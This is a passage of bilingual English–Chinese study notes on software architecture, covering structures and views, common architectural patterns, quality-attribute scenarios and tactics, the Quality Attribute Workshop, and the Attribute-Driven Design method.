useful Allocation structures"></a>Some useful Allocation structures</h4></li><li>Deployment structure<br>The deployment structure shows how software is assigned to hardware processing and communication elements.<br>部署结构显示软件是如何分配给硬件处理和通信元素的。<br>allocated-to关系<br>performance, data integrity, security, and availability </li><li>Implement structure<br>This structure shows how software elements (usually modules) are mapped to the file structure(s) in the system’s development, integration, or configuration control environments.<br>这个结构显示了软件元素（通常是模块）如何映射到系统开发、集成或配置控制环境中的文件结构中。</li><li>Work assignment structure<br>This structure assigns responsibility for implementing and integrating the modules to the teams who will carry it out.<br>这种结构将执行和集成模块的责任分配给执行它的团队。</li></ul><h5 id="结构和视图-structure-and-view"><a href="#结构和视图-structure-and-view" class="headerlink" title="结构和视图　structure and view"></a>结构和视图　structure and view</h5><ul><li>A view is a representation of a coherent set of architectural elements, as written by and read by system stakeholders. </li><li>A structure is the set of elements itself, as they exist in software or hardware.<br>视图是结构的表示。</li></ul><h3 id="Architecture-Pattern-架构模式"><a href="#Architecture-Pattern-架构模式" class="headerlink" title="Architecture Pattern 架构模式"></a>Architecture Pattern 架构模式</h3><p>An architectural pattern presents the element types and their forms of interaction used in solving a particular problem.<br>体系结构模式展示了用于解决特定问题的元素类型及其交互形式。</p><ul><li>Module type pattern<ul><li>Layered pattern<br>软件元素之间的使用关系是严格单向的</li></ul></li><li>Component-and-connector type pattern<ul><li>Shared-data(or repository) pattern<br>This pattern comprises components and connectors that create, store, and access persistent data.<br>该模式包括创建、存储和访问持久数据的组件和连接器。</li><li>Client-server pattern</li><li>Peer-to-peer pattern</li></ul></li><li>Allocation type pattern<ul><li>Multi-tier pattern 多层模式<br>This pattern specializes the generic deployment (software-to-hardware allocation) structure. Describes how to distribute and allocate the components of a system in distinct subsets of hardware and software, connected by some communication medium.<br>此模式专门用于泛型部署（软件到硬件分配）结构。描述如何在不同的通信介质连接的硬件和软件的不同子集中分配和分配系统的组件。</li><li>Competence center pattern 能力中心模式<br>In competence center, work is allocated to sites depending on the technical or domain expertise located at a site.<br>在能力中心，工作分配给地点，取决于位于某个地点的技术或领域专门知识。</li><li>Platform pattern 平台模式<br>In platform, one site is tasked with developing reusable core assets of a software product line, and other sites develop applications that use the core assets.<br>在平台上，一个站点负责开发软件产品线的可重用核心资产，而其他站点则开发使用核心资产的应用程序。</li></ul></li></ul><h2 id="Why-Is-Software-Architecture-Important"><a href="#Why-Is-Software-Architecture-Important" class="headerlink" title="Why Is Software Architecture Important?"></a>Why Is Software Architecture Important?</h2><ol><li>An architecture will inhibit or enable a system’s driving quality attributes.<br>体系结构将抑制或启用系统的驱动质量属性。</li><li>The decisions made in an architecture allow you to reason about and manage change as the system evolves.<br>体系结构中的决策允许您在系统演进时推理和管理更改。</li><li>The analysis of an architecture enables early prediction of a system’s qualities.<br>对体系结构的分析可以对系统的质量进行早期预测。</li><li>A documented architecture enhances communication among stakeholders.<br>文档化体系结构增强了涉众之间的沟通。</li><li>The architecture is a carrier of the earliest and hence most fundamental, hardest-to-change design decisions.<br>体系结构是最早、最基本、最难改变设计决策的载体。</li><li>An architecture defines a set of constraints on subsequent implementation.<br>体系结构在随后的实现中定义了一组约束。</li><li>The architecture dictates the structure of an organization, or vice versa.<br>体系结构决定了一个组织的结构，反之亦然。</li><li>An architecture can provide the basis for evolutionary prototyping.<br>体系结构可以为演化原型提供基础。</li><li>An architecture allows the architect and project manager to reason about cost and schedule.<br>体系结构允许架构师和项目经理推断成本和进度。</li><li>An architecture can be created as a transferable, reusable model that form the heart of a product line.<br>体系结构可以创建为可转移的、可重用的模型，形成产品线的核心。</li><li>Architecture-based development focuses attention on the assembly of components, rather than simply on their creation.<br>基于体系结构的开发关注的是组件的组装，而不是简单地创建它们。</li><li>By restricting design alternatives, architecture channels the creativity of developers, reducing design and system complexity.<br>通过限制设计方案，体系结构可以拓宽开发人员的创造力，减少设计和系统复杂性。</li><li>An architecture can be the foundation for training a new team member.<br>架构可以是培训新团队成员的基础。</li></ol><h4 id="Whether-a-system-will-be-able-to-exhibit-its-desired-or-required-quality-attributes-is-substantially-determined-by-its-architecture"><a href="#Whether-a-system-will-be-able-to-exhibit-its-desired-or-required-quality-attributes-is-substantially-determined-by-its-architecture" class="headerlink" title="Whether a system will be able to exhibit its desired (or required) quality attributes is substantially determined by its architecture."></a>Whether a system will be able to exhibit its desired (or required) quality attributes is substantially determined by its architecture.</h4><p>一个系统是否能够展示它的所需（或要求）质量属性是大体上取决于它的架构</p><h3 id="3类变更"><a href="#3类变更" class="headerlink" title="3类变更"></a>3类变更</h3><ul><li>A local change can be accomplished by modifying a single element.</li><li>A nonlocal change requires multiple element modifications but leaves the underlying architectural approach intact.</li><li>An architectural change affects the fundamental ways in which the elements interact with each other and will require changes all over the system.</li></ul><h2 id="The-many-contexts-of-software-architecture-软件体系结构的多种背景"><a href="#The-many-contexts-of-software-architecture-软件体系结构的多种背景" class="headerlink" title="The many contexts of software architecture 软件体系结构的多种背景"></a>The many contexts of software architecture 软件体系结构的多种背景</h2><h3 id="Technical"><a href="#Technical" class="headerlink" title="Technical"></a>Technical</h3><p>What technical role does the software architecture play in the system?<br>软件体系结构在系统中扮演什么样的技术角色？</p><h3 id="Project-life-cycle"><a href="#Project-life-cycle" class="headerlink" title="Project life cycle"></a>Project life cycle</h3><p>How does a software architecture relate to the other phases of a software development life cycle?<br>软件体系结构如何与软件开发生命周期的其他阶段相关联？</p><h3 id="Business"><a href="#Business" class="headerlink" title="Business"></a>Business</h3><p>How does the presence of a software architecture affect an organization’s business environment?<br>软件体系结构的存在如何影响组织的业务环境？</p><h3 id="Professional"><a href="#Professional" class="headerlink" title="Professional"></a>Professional</h3><p>What is the role of a software architect in an organization or a development project?<br>软件架构师在组织或开发项目中的作用是什么？</p><h5 id="技术环境、项目生命周期、商业环境、架构师职业环境中的软件体系结构。架构与环境的相互影响。"><a href="#技术环境、项目生命周期、商业环境、架构师职业环境中的软件体系结构。架构与环境的相互影响。" class="headerlink" title="技术环境、项目生命周期、商业环境、架构师职业环境中的软件体系结构。架构与环境的相互影响。"></a>技术环境、项目生命周期、商业环境、架构师职业环境中的软件体系结构。架构与环境的相互影响。</h5><p>An architecture has influences that lead to its creation, and its existence has an impact on the architect, the organization, and, potentially, the industry<br>一个架构会影响它的产生，它的存在对架构师，组织，可能还有行业都有影响。</p><h1 id="Quality-attributes"><a href="#Quality-attributes" class="headerlink" title="Quality attributes"></a>Quality attributes</h1><h3 id="Understanding-Quality-Attributes"><a href="#Understanding-Quality-Attributes" class="headerlink" title="Understanding Quality Attributes"></a>Understanding Quality Attributes</h3><p>系统需求可以分为</p><ul><li>Functional requirements 功能需求</li><li>Quality Attribute requirement 质量属性需求</li><li>Constraints 约束<h3 id="两类质量属性"><a href="#两类质量属性" class="headerlink" title="两类质量属性"></a>两类质量属性</h3></li><li>描述系统运行时的属性，availability，performance，usability，security</li><li>描述开发系统时属性 ，modifiability，testability<h3 id="A-solution-to-the-problems-untestable-definitions-and-overlapping-concerns-is-to-use-quality-attribute-scenarios-as-a-means-of-characterizing-quality-attributes"><a href="#A-solution-to-the-problems-untestable-definitions-and-overlapping-concerns-is-to-use-quality-attribute-scenarios-as-a-means-of-characterizing-quality-attributes" class="headerlink" title="A solution to the problems (untestable definitions and overlapping concerns) is to use quality attribute scenarios as a means of characterizing quality attributes."></a>A solution to the problems (untestable definitions and overlapping concerns) is to use quality attribute scenarios as a means of characterizing quality attributes.</h3></li></ul><h3 id="描述质量属性场景-quality-attribute-scenarios"><a href="#描述质量属性场景-quality-attribute-scenarios" class="headerlink" title="描述质量属性场景 quality attribute scenarios"></a>描述质量属性场景 quality attribute scenarios</h3><ol><li>Stimulus<br>The stimulus is a condition that requires a response when it arrives at a system</li><li>Stimulus source<br>This is some entity (a human, a computer system, or any other actuator) that generated the stimulus.</li><li>Response<br>The response is the activity undertaken as the result of the arrival of the stimulus.</li><li>Response measure<br>When the response occurs, it should be measurable in some fashion so that the requirement can be tested</li><li>Environment<br>The stimulus occurs under certain conditions. The system may be in an overload condition or in normal operation, or some other relevant state.</li><li>Artifact<br>This may be a collection of systems, the whole system, or some piece or pieces of it. Some artifact is stimulated.<br><img src="/img/architecture/1.png" alt=""></li></ol><h3 id="质量属性场景分类"><a href="#质量属性场景分类" class="headerlink" title="质量属性场景分类"></a>质量属性场景分类</h3><ul><li><em>General quality attribute scenarios</em> are system independent and can, potentially, pertain to any system</li><li><em>Concrete quality attribute scenarios</em> are specific to the particular system under consideration.</li></ul><h3 id="Tactics"><a href="#Tactics" class="headerlink" title="Tactics"></a>Tactics</h3><p>There are a collection of primitive design techniques that an architect can use to achieve a quality attribute response.<br>有一个原始设计技术的集合，架构师可以使用它来实现质量属性响应。<br>We call these architectural design primitives tactics.</p><h3 id="Tactics-VS-Architectute-pattern"><a href="#Tactics-VS-Architectute-pattern" class="headerlink" title="Tactics VS Architectute pattern"></a>Tactics VS Architectute pattern</h3><ul><li>A tactic is a design decision for a single quality attribute</li><li>A tactic does not consider tradeoffs among quality attributes</li><li>Architectural patterns can be seen as “packages” of tactics, in which tradeoffs are considered</li></ul><h4 id="We-need-to-isolate-catalog-and-describe-the-tactics-Why-do-we-do-this"><a href="#We-need-to-isolate-catalog-and-describe-the-tactics-Why-do-we-do-this" class="headerlink" title="We need to isolate, catalog, and describe the tactics. Why do we do this?"></a>We need to isolate, catalog, and describe the tactics. Why do we do this?</h4><ol><li>Design patterns are complex, and often difficult to apply as is; architects need to modify and adapt them.</li><li>If no pattern exists to realize the architect’s design goal, tactics allow the architect to construct a design fragment from “first principles”.</li><li>By cataloguing tactics, we will have a choice of multiple tactics to improve a particular quality attribute. The choice of which tactics to use depends on factors such as the cost to implement.</li><li>设计模式是复杂的，而且通常很难应用，架构师需要修改和调整它们。</li><li>如果没有模式来实现架构师的设计目标，策略允许架构师从“第一原理”构建一个设计片段。</li><li>通过编目策略，我们可以选择多种策略来改进特定的质量属性。选择使用哪种战术取决于实施成本等因素。</li></ol><h3 id="Guiding-Quality-Design-Decisions"><a href="#Guiding-Quality-Design-Decisions" class="headerlink" title="Guiding Quality Design Decisions"></a>Guiding Quality Design Decisions</h3><ol><li>Allocation of responsibilities 职责分配</li><li>Coordination model 协调模型</li><li>Data model 数据模型</li><li>Management of resources 管理资源</li><li>Mapping among architectural elements 构建元素间的映射</li><li>Binding time decisions 结合时间的决定</li><li>Choice of technology 技术的选择</li></ol><h2 id="availability-可用性"><a href="#availability-可用性" class="headerlink" title="availability 可用性"></a>availability 可用性</h2><p>Availability refers to the ability of the system to be available for use when a fault occurs.<br>可用性是指系统在故障发生时可用的能力。<br>Availability tactics enable a system to endure faults so that services remain compliant with their specifications.<br>The tactics keep faults from becoming failures or at least bound the effects of the fault and make repair possible.<br>可用性策略使系统能够容忍故障，从而使服务与规范保持一致。<br>战术使故障不再成为故障或至少约束故障的影响并使修复成为可能。</p><ul><li>Detect Fault<ul><li>Ping/echo</li><li>Monitor</li><li>Heartbeat<br>Timestamp, Condition Monitoring, Voting, Exception Detection, Self-test</li></ul></li><li>Recover from Faults<ul><li>Active Redundancy (hot spare)</li><li>Spare (cold spare)</li><li>Passive Redundancy (warm spare)<br>Rollback, Exception Handling, Degradation, Reconfiguration<br>降级：在组件失败的情况下维护最关键的系统功能，减少不重要的功能。<br>重构：重新分配职责，离开运作的资源，同时保持尽可能多的功能。</li></ul></li><li>Prevent Faults<ul><li>Removal From Service</li><li>Transactions</li><li>Predictive Model</li><li>Exception Prevention</li><li>Increase Competence Set<br>删除服务：暂时将系统组件置于服务状态之外，以减轻潜在的系统故障。<br>事务：捆绑状态更新，以便在分布式组件之间交换的异步消息具有原子性、一致性、隔离性和持久性。<br>预测模型：在检测到可能出现的未来故障的情况下，采取纠正措施。<br>异常预防：通过智能指针、抽象数据类型、包装器防止系统异常发生。<br>增加权限集：设计一个组件来处理更多的故障，作为其正常运行的一部分。</li></ul></li></ul><p>Detection tactics depend on detecting signs of life from various components.<br>检测策略依赖于从各个组成部分检测生命迹象。<br>Recovery tactics are retrying an operation or maintaining redundant data or computations.<br>恢复策略是重试操作或维护冗余数据或计算。<br>Prevention tactics depend on removing elements from service or limiting the scope of faults.<br>预防策略依赖于从服务中删除元素或限制故障范围。</p><h4 id="Interoperability-互操作性"><a href="#Interoperability-互操作性" class="headerlink" title="Interoperability 互操作性"></a>Interoperability 互操作性</h4><p>Interoperability is about the degree to which two or more systems can usefully exchange meaningful information via interfaces in a particular context.<br>互操作性是指两个或多个系统能够通过特定上下文中的接口有效地交换有意义的信息的程度。</p><ul><li>Discovery</li><li>Handling the response<br>Syntactic interoperability is the ability to exchange data.<br>Semantic interoperability is the ability to interpret the data being exchanged.<br>语法互操作性是交换数据的能力。<br>语义互操作性是对正在交换的数据进行解释的能力。<br>Two technology options to allow the webbased application to interoperate<br>SOAP is used in SOA systems along with a set of protocols<br>– Service description&amp; discovery, e.g., WSDL, UDDI<br>– Service composition, e.g., BPEL<br>SOAP is more complex and used for exchange messages with structured data, while REST is simple and used for small messages<br>两个技术选项允许基于Web的应用程序的互操作<br>SOAP在SOA系统中和一组协议一起使用。<br>-服务描述和发现，例如WSDL、UDDI<br>-服务组合，例如BPEL<br>SOAP更复杂，用于与结构化数据交换消息，而REST很简单，用于小消息。<h5 id="Goal-of-Interoperability-Tactics"><a href="#Goal-of-Interoperability-Tactics" class="headerlink" title="Goal of Interoperability Tactics"></a>Goal of Interoperability Tactics</h5>实现互操作性涉及到相互定位的系统，然后管理接口，以便它们交换信息。</li><li>Locate</li><li>Manage Interfaces</li></ul><h2 id="modifiability-可修改性"><a href="#modifiability-可修改性" class="headerlink" title="modifiability 可修改性"></a>modifiability 可修改性</h2><p>Modifiability is about change and our interest in it is in the cost and risk of making changes.<br>可修改性是关于变更的，我们对它的兴趣在于改变的成本和风险。</p><h4 id="Goal-of-Modifiability-Tactics"><a href="#Goal-of-Modifiability-Tactics" class="headerlink" title="Goal of Modifiability Tactics"></a>Goal of Modifiability Tactics</h4><ul><li>Reduce Size of a Module</li><li>Increase Cohesion</li><li>Reducing Coupling</li><li>Defer Binding<h4 id="Publish-Subscribe-System"><a href="#Publish-Subscribe-System" class="headerlink" title="Publish/Subscribe System"></a>Publish/Subscribe System</h4></li></ul><h2 id="performance-性能"><a href="#performance-性能" class="headerlink" title="performance  性能"></a>performance  性能</h2><p><em>It is about time</em><br>Performance is about time and the software system’s ability to meet timing requirements<br>性能是关于时间和软件系统满足时序要求的能力。</p><h4 id="Performance-Tactics"><a href="#Performance-Tactics" class="headerlink" title="Performance Tactics"></a>Performance Tactics</h4><ul><li>Control Resource Demand</li><li>Manage Resources</li></ul><h2 id="security-安全性"><a href="#security-安全性" class="headerlink" title="security 安全性"></a>security 安全性</h2><p>Security is a measure of the system’s ability to protect data and information from unauthorized access while still providing access to people and systems that are authorized<br>安全性是衡量系统保护数据和信息免受未经授权访问的能力的一种度量方法，同时还提供对被授权的人和系统的访问。</p><ul><li>Confidentiality 保密性</li><li>Integrity 完整性</li><li>Availability 可用性<br>另外一种特性分类</li><li>Authentication 身份验证</li><li>Authorization 授权</li><li>Nonrepudiation 不可抵赖性<h4 id="Security-Tactics"><a href="#Security-Tactics" class="headerlink" title="Security Tactics"></a>Security Tactics</h4></li><li>Detect Attacks</li><li>Resist Attacks</li><li>React to Attacks</li><li>Recover from Attacks</li></ul><h2 id="testability-可测性"><a href="#testability-可测性" class="headerlink" title="testability 可测性"></a>testability 可测性</h2><p>Software testability refers to the ease with which software can be made to demonstrate its faults through (typically execution-based) testing.<br>软件可测试性指的是软件可以通过（通常是基于执行的）测试来演示其故障的容易程度。<br>Testability refers to the probability that it will fail on its next test execution.<br>可测试性指的是它在下一次测试执行时失败的概率。</p><h4 id="Testability-Tactics"><a href="#Testability-Tactics" class="headerlink" title="Testability Tactics"></a>Testability Tactics</h4><ul><li>Control and Observe System State</li><li>Limit Complexity</li></ul><h2 id="usability-可使用性"><a href="#usability-可使用性" class="headerlink" title="usability 可使用性"></a>usability 可使用性</h2><p>Usability is concerned with how easy it is for the user to accomplish a desired task and the user support the system provides<br>可使用性涉及到用户完成所需任务和用户支持系统提供的方便程度。</p><h4 id="Usability-Tactics"><a href="#Usability-Tactics" class="headerlink" title="Usability Tactics"></a>Usability Tactics</h4><ul><li>Support User Initiative</li><li>Support System Initiative</li></ul><h4 id="Portability-可移植性"><a href="#Portability-可移植性" class="headerlink" title="Portability 可移植性"></a>Portability 可移植性</h4><p>Portability refers to the ease with which software that built to run on one platform can be changed to run on a different platform. </p><h3 id="Patterns-and-Tactics"><a href="#Patterns-and-Tactics" class="headerlink" title="Patterns and Tactics"></a>Patterns and Tactics</h3><p>An architecture pattern is a package of design decisions that is found repeatedly in practice has known properties that permits reuse, and describes a class of architectures<br>体系结构模式是在实践中反复发现的一种设计决策包，它知道允许重用的属性，并描述了一类体系结构。</p><h4 id="Moule-patterns"><a href="#Moule-patterns" class="headerlink" title="Moule patterns"></a>Moule patterns</h4><ul><li>Layered pattern 层次模式<br>The layered pattern defines layers and a unidirectional allowed-to-use relation among the layers.<br>分层模式定义层，单向允许使用层之间的关系。 <ul><li>context: Modules of the system may be independently developed and maintained.<br>系统的模块可以独立开发和维护。</li><li>Problem: To minimize the interaction among the different development organizations, and support portability, modifiability, and reuse.<br>问题：减少发展的不同组织之间的相互作用，并支持可移植性、可修改性、和重用。</li><li>Solution: the layered pattern divides the software into units called layers. Each layer is a grouping of modules that offers a cohesive set of services. Each layer is exposed through a public interface. The usage must be unidirectional.<br>解决方案：分层模式将软件划分为层。每一层都是一组模块，它们提供了一组内聚的服务。每个层通过公共接口公开。用法必须是单向的。<h4 id="Component-and-Connector-patterns"><a href="#Component-and-Connector-patterns" class="headerlink" title="Component-and-Connector patterns"></a>Component-and-Connector patterns</h4></li></ul></li><li>Broker pattern 代理模式<br>The broker pattern defines a runtime component, called a broker, that mediates the communication between a number of clients and servers.<br>代理模式定义了一个运行时组件，称为代理，它代理多个客户机和服务器之间的通信。<ul><li>Context: Many systems are constructed from a collection of services distributed across multipl servers<br>背景：许多系统是由一组服务分布在多台服务器</li><li>Problem: How do we structure distributed software so that service users do not need to know the nature and location of service providers?<br>问题：我们如何构造分布式软件，使服务使用者不需要知道服务提供者的性质和位置？</li><li>Solution: The broker pattern separates clients from providers servers by inserting an intermediary, called a broker. When a client needs a service, it queries a broker via a service interface. The broker then forwards the client’s service request to a server, which processes the request.<br>解决方案：代理模式通过插入中介（称为代理）将客户机与提供者服务器分开。当客户机需要服务时，它通过服务接口查询代理。然后，代理将客户机的服务请求转发给服务器，该服务器处理请求。</li></ul></li><li>Model-View-Controller pattern MVC模式<ul><li>Context: User interface software is the most frequently modified portion of an interactive application.<br>背景：用户界面软件是交互式应用程序中最经常修改的部分。</li><li>Problem: How can user interface functionality be kept separate from application functionality and yet still be responsive to user input, or to changes in the underlying application’s data? And how can multiple views of the user interface be created, maintained, and coordinated when the underlying application data changes?<br>问题：如何将用户界面功能与应用程序功能分开，但仍然响应用户输入，还是对底层应用程序的数据进行响应？当底层应用程序数据发生变化时，如何创建、维护和协调用户界面的多个视图？</li><li>Solution: The model-view-controller (MVC) pattern separates application functionality into three kinds of components: A model, which contains the application’s data; A view, which displays some portion of the underlying data and interacts with the user; A controller, which mediates between the model and the view and manages the notifications of state changes<br>解决方案：模型-视图-控制器（MVC）模式将应用程序功能划分为三种组件：一个模型，其中包含应用程序的数据; 视图，显示底层数据的一部分并与用户交互; 一个控制器，它在模型和视图之间进行中介，管理状态变化的通知。</li></ul></li><li>Pipe-and-Filter pattern 管道-过滤器模式<ul><li>Context: Streaming data processing<br>背景：流数据处理</li><li>Problem: How to speed up the data processing?<br>问题：如何加速数据处理？</li><li>Solution: Data arrives at a filter’s input port, is transformed, and then is passed via its output port through a pipe to the next filter.  A single filter can consume data from, or produce data to, one or more ports.<br>解决方案：数据到达过滤器的输入端口，进行转换，然后通过其输出端口通过管道传递到下一个过滤器。单个筛选器可以将数据从或一个或多个端口消耗到或生成数据。</li></ul></li><li>Client-Server pattern CS模式<ul><li>Context: There are shared resources and services that large numbers of distributed clients wish to access, and for which we wish to control access or quality of service.<br>背景：大量分布式客户机希望访问共享资源和服务，我们希望控制访问或服务质量。</li><li>Problem: To improve scalability and availability by centralizing the control of these resources and services.<br>问题：通过集中控制这些资源和服务来提高可伸缩性和可用性。</li><li>Solution: Clients interact by requesting services of servers. Some components may act as both clients and servers. There may be one central server or multiple distributed ones<br>解决方案：客户端通过请求服务器的服务进行交互。一些组件可以同时充当客户端和服务器。可能有一个中央服务器或多个分布式服务器。</li></ul></li><li><p>Peer-to-Peer pattern P2P模式</p><ul><li>Context: Distributed computational entities need to cooperate and collaborate to provide a service to a distributed community of users.<br>背景：分布式计算实体需要合作和协作以向分布式用户社区提供服务。</li><li>Problem: How can a set of “equal” distributed computational entities be connected to each other via a common protocol, such that they can organize and share their services with high availability and scalability?<br>问题：一组“相同”的分布式计算实体如何通过一个公共协议相互连接，这样它们就可以组织并共享其高可用性和可伸缩性的服务？</li><li>Solution: In the peer-to-peer (P2P) pattern, components directly interact as peers. All peers are “equal”. Peer-to-peer communication is typically a request/reply interaction without the asymmetry found in the clientserver pattern.<br>解决方案：在点对点（P2P）模式中，组件直接作为对等体交互。所有的peers都是平等的。对等通信是一个典型的没有不对称的CS模式发现请求/应答的作用。</li></ul></li><li><p>Service-Oriented Architecture (SOA) pattern SOA模式</p><ul><li>Context: Service consumers need to be able to understand and use services without any knowledge of their implementation.<br>背景：服务消费者需要了解和使用服务，而不需要了解服务的实现。</li><li>Problem: How can we support interoperability of distributed components running on different platforms and written in different implementation languages, provided by different organizations, and distributed across the Internet?<br>问题：我们如何支持在不同平台上运行的分布式组件的互操作性，以及由不同组织提供的不同实现语言编写，并在Internet上分发？</li><li>Solution: The service-oriented architecture (SOA) pattern describes a collection of distributed components that provide and/or consume services.<br>解决方案：面向服务的体系结构（SOA）模式描述了提供和/或服务的分布式组件的集合。</li></ul></li><li><p>Publish-Subscribe pattern 发布订阅模式</p><ul><li>Context: The precise number and nature of the data producers and consumers are not predetermined or fixed.<br>背景：数据生产者和消费者的确切数量和性质不是预先确定的或固定的。</li><li>Problem: To transmit messages among the producers and consumers so they are unaware of each other’s identity, or even their existence?<br>问题：在生产者和消费者之间传递信息，使他们不知道对方的身份，甚至他们的存在？</li><li>Solution: Provides decoupling in time, space and synchronization.<br>解决方案：提供时间、空间和同步的解耦。</li></ul></li><li><p>Shared-Data pattern 共享数据模式</p><ul><li>Context: Various computational components need to share and manipulate large amounts of data. This data does not belong solely to any one of those components.<br>背景：各种计算组件需要共享和操作大量数据。这些数据并不完全属于这些组件中的任何一个。</li><li>Problem: How can systems store and manipulate persistent data that is accessed by multiple independent components?<br>问题：系统如何存储和操作由多个独立组件访问的持久数据？</li><li>Solution: In the shared-data pattern, interaction is dominated by the exchange of persistent data between multiple data accessors and at least one shared-data store. Exchange may be initiated by the accessors or the data store. The connector type is data reading and writing. Communication between data accessors is mediated by a shared data store. Data is made persistent by the data store.<br>解决方案：在共享数据模式，相互作用是由多个数据访问和至少一个共享数据存储之间的数据交流为主的持续性。交易所可以通过访问或数据存储启动。连接器类型是数据读写。之间的数据访问的通信是通过共享数据存储介。数据由数据存储持久化。<h4 id="Allocation-patterns"><a href="#Allocation-patterns" class="headerlink" title="Allocation patterns"></a>Allocation patterns</h4></li></ul></li><li>Map-Reduce pattern Map-Reduce模式</li><li>Multi-tier Pattern 多级模式</li></ul><h3 id="Tatics-和-Pattern"><a href="#Tatics-和-Pattern" class="headerlink" title="Tatics 和 Pattern"></a>Tatics 和 Pattern</h3><p>Patterns are built from tactics; if a pattern is a molecule, a tactic is an atom.<br>Patterns are underspecified with respect to real systems so they have to be augmented with tactics.</p><h4 id="Tatics-建模与分析"><a href="#Tatics-建模与分析" class="headerlink" title="Tatics 建模与分析"></a>Tatics 建模与分析</h4><p>Analysis can be done through</p><ul><li>Models for some attributes 某些属性的模型</li><li>Measurement 测量</li><li>Simulations 模拟</li><li>Prototypes 原型</li><li>experiments &amp; Back-of-the-envelope analysis 实验与包络分析</li></ul><h4 id="敏捷开发"><a href="#敏捷开发" class="headerlink" title="敏捷开发"></a>敏捷开发</h4><p>Boehm and Turner found that projects have a “sweet spot” where up-front architecture planning pays off.<br>Boehm和Turner发现，项目有一个甜蜜点在前面的建筑规划的回报。<br>Architecture Tradeoff Analysis Method (ATAM)</p><h1 id="Architecture-in-the-life-cycle"><a href="#Architecture-in-the-life-cycle" class="headerlink" title="Architecture in the life cycle"></a>Architecture in the life cycle</h1><h2 id="requirement"><a href="#requirement" class="headerlink" title="requirement"></a>requirement</h2><h4 id="ASR-Architecturally-Significant-Requirement-重要的架构需求"><a href="#ASR-Architecturally-Significant-Requirement-重要的架构需求" class="headerlink" title="ASR = Architecturally Significant Requirement = 重要的架构需求"></a>ASR = Architecturally Significant Requirement = 重要的架构需求</h4><h3 id="Approaches-to-Capture-ASRs"><a href="#Approaches-to-Capture-ASRs" class="headerlink" title="Approaches to Capture ASRs"></a>Approaches to Capture ASRs</h3><ul><li>From Requirements Document</li><li>By Interviewing Stakeholders</li><li>By Understanding the Business Goals</li><li>In Utility Tree<h4 id="ASRs-may-be-captured"><a href="#ASRs-may-be-captured" class="headerlink" title="ASRs may be captured"></a>ASRs may be captured</h4></li><li>from requirements documents,</li><li>by interviewing stakeholders, or</li><li>by conducting a Quality Attribute Workshop.</li></ul><h4 id="QAW-Quality-Attribute-Workshop-质量属性研讨会"><a href="#QAW-Quality-Attribute-Workshop-质量属性研讨会" class="headerlink" title="QAW = Quality Attribute Workshop = 质量属性研讨会"></a>QAW = Quality Attribute Workshop = 质量属性研讨会</h4><p>Step 1: QAW Presentation and Introductions<br>步骤1：QAW演示和介绍<br>Step 2: Business/Mission Presentation<br>步骤2：业务/任务介绍<br>Step 3: Architectural Plan Presentation<br>步骤3：架构计划展示<br>Step 4: Identification of Architectural Drivers.<br>步骤4：确定架构驱动程序。<br>Step 5: Scenario Brainstorming.<br>步骤5：质量属性场景头脑风暴。<br>Step 6: Scenario Consolidation<br>步骤6：整合质量属性场景<br>Step 7: Scenario Prioritization<br>步骤7：给质量属性场景分优先级<br>Step 8: Scenario Refinement.<br>步骤8：对质量属性场景进行细化。</p><h4 id="Capturing-ASRs-in-a-Utility-Tree"><a href="#Capturing-ASRs-in-a-Utility-Tree" class="headerlink" title="Capturing ASRs in a Utility Tree"></a>Capturing ASRs in a Utility Tree</h4><h2 id="design"><a href="#design" class="headerlink" title="design"></a>design</h2><h4 id="Design-Strategy"><a href="#Design-Strategy" class="headerlink" title="Design Strategy"></a>Design Strategy</h4><ul><li><p>Decomposition<br>Architecture determines quality attributes<br>体系结构决定质量属性<br>Important quality attributes are characteristics of the whole system.<br>重要的质量属性是整个系统的特征。<br>Design begins with the whole system</p><ul><li>The whole system is decomposed into parts</li><li>Each part may inherit all or part of the quality attribute requirements<br>设计从整个系统开始。<br>-整个系统被分解成部分<br>-每个部分都可以继承全部或部分质量属性需求。</li></ul></li><li><p>Designing to Architecturally Significant Requirements</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Q1. What About Other Quality Requirements?</span><br><span class="line">If your design does not satisfy a particular non ASR quality requirement</span><br><span class="line">- Adjust your design so that the ASRs are still satisfied and so is this additional requirement or</span><br><span class="line">- Weaken the additional requirement so that it can be satisfied either by the current design or by a modification of the current design or</span><br><span class="line">- Change the priorities so that the one not satisfied becomes one of the ASRs or</span><br><span class="line">- Declare the additional requirement non-satisfiable in conjunction with the ASRs.</span><br><span class="line">如果您的设计不满足特定的非ASR质量要求</span><br><span class="line">调整你的设计，ASRs还满意，所以这是额外的要求或</span><br><span class="line">削弱额外的要求，使之能够满足当前设计或修改当前的设计或</span><br><span class="line">变化的重点，一个不满意成为一个ASR或</span><br><span class="line">申报的额外要求非与ASRs一起满足。</span><br></pre></td></tr></table></figure></li><li><p>Generate and Test</p></li></ul><ol><li>View the current design as a hypothesis.<br>把当前的设计看作是一个假设。</li><li>Ask whether the current design satisfies the requirements (test)<br>询问当前的设计是否满足要求（测试）</li><li>If not, then generate a new hypothesis<br>如果没有，则产生一个新的假设。<h3 id="ADD-The-Attribute-Driven-Design-Method-属性驱动设计方法"><a href="#ADD-The-Attribute-Driven-Design-Method-属性驱动设计方法" class="headerlink" title="ADD = The Attribute-Driven Design Method = 属性驱动设计方法"></a>ADD = The Attribute-Driven Design Method = 属性驱动设计方法</h3>An iterative method. At each iteration you</li></ol><ul><li>Choose a part of the system to design.</li><li>Marshal all the architecturally significant requirements for that part.</li><li>Generate and test a design for that part.<br>ADD does not result in a complete design</li><li>Set of containers with responsibilities</li><li>Interactions and information flow among containers<br>Does not produce an API for containers.<br>迭代法。每次迭代时<br>-选择系统的一部分进行设计。<br>-把所有重要的建筑要求的那一部分。<br>-生成并测试该部分的设计。<br>添加不会导致完整的设计。<br>-有责任的容器集<br>-容器间的交互和信息流<br>不为容器生成api。<h4 id="step-of-ADD"><a href="#step-of-ADD" class="headerlink" title="step of ADD"></a>step of ADD</h4></li></ul><ol><li>Choose an element of the system to design.<br>选择系统的元素进行设计。</li><li>Identify the ASRs for the chosen element.<br>确定所选元素的ASRs</li><li>Generate a design solution for the chosen element.<br>为所选元素生成设计解决方案。</li><li>Inventory remaining requirements and select the input for the next iteration.<br>统计剩余需求，并为下一次迭代选择输入。</li><li>Repeat steps 1–4 until all the ASRs have been 